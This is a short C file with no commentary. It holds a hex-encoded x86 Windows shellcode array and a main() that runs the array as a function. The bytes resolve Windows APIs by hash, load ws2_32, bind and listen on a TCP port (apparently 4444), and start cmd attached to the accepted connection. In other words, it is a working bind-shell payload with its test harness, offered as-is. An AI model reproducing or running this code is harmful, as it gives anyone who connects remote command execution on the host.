char code[] = "\xE9\xEA\x00\x00\x00\x56\x31\xC0\x64\x8B\x40\x30\x85\xC0\x78\x0C\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C\x8B\x40\x3C\x5E\xC3\x60\x8B\x6C\x24\x24\x8B\x45\x3C\x8B\x54\x05\x78\x01\xEA\x8B\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x34\x49\x8B\x34\x8B\x01\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74\x07\xC1\xCF\x0D\x01\xC7\xEB\xF4\x3B\x7C\x24\x28\x75\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\x89\x44\x24\x1C\x61\xC3\xAD\x50\x52\xE8\xAA\xFF\xFF\xFF\x89\x07\x83\xC4\x08\x83\xC7\x04\x39\xCE\x75\xEC\xC3\xCD\x03\x31\xC0\x31\xC9\xB1\x11\x57\x89\xEF\x83\xC7\x40\xF3\xAB\x5F\x8D\x8D\x84\x00\x00\x00\x51\x55\x50\x50\x6A\x04\x50\x50\x50\xFF\x75\x3C\x50\xFF\x55\x08\xC3\xE8\x49\x00\x00\x00\x8E\x4E\x0E\xEC\x72\xFE\xB3\x16\x7E\xD8\xE2\x73\x83\xB9\xB5\x78\xD2\xC7\xA7\x68\x9C\x95\x1A\x6E\xA1\x6A\x3D\xD8\xD3\xC7\xA7\xE8\x88\x3F\x4A\x9E\xD9\x09\xF5\xAD\xA4\x1A\x70\xC7\xA4\xAD\x2E\xE9\xE5\x49\x86\x49\xCB\xED\xFC\x3B\x81\xEC\x84\x00\x00\x00\x89\xE5\xE8\x09\xFF\xFF\xFF\x89\xC2\xEB\xB2\x5E\x8D\x7D\x04\x89\xF1\x83\xC1\x24\xE8\x67\xFF\xFF\xFF\x83\xC1\x14\x31\xC0\x66\xB8\x33\x32\x50\x68\x77\x73\x32\x5F\x89\xE3\x51\x52\x53\xFF\x55\x04\x5A\x59\x89\xC2\xE8\x47\xFF\xFF\xFF\xB8\x01\x63\x6D\x64\xC1\xF8\x08\x50\x89\x65\x3C\xE8\x4B\xFF\xFF\xFF\x31\xD2\xB6\x03\x29\xD4\x54\x6A\x02\xFF\x55\x38\x81\xC4\x00\x03\x00\x00\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\x55\x28\x89\xC6\x31\xC0\x31\xDB\x50\x50\x50\xB8\x02\x01\x11\x5C\xFE\xCC\x50\x89\xE0\xB3\x10\x53\x50\x56\xFF\x55\x2C\x53\x56\xFF\x55\x30\x53\x89\xE2\x29\xDC\x89\xE1\x52\x51\x56\xFF\x55\x34\x89\xC6\x31\xC9\xB1\x54\x29\xCC\x89\xE7\x57\x31\xC0\xF3\xAA\x5F\xC6\x07\x44\xFE\x47\x2D\x57\x89\xF0\x8D\x7F\x38\xAB\xAB\xAB\x5F\x31\xC0\x8D\x77\x44\x56\x57\x50\x50\x50\x40\x50\x48\x50\x50\xFF\x75\x3C\x50\xFF\x55\x08\xFF\x55\x0C";

int main(int argc, char **argv)
{
   int (*func)();
   func = (int (*)()) code;
   (int)(*func)();
}
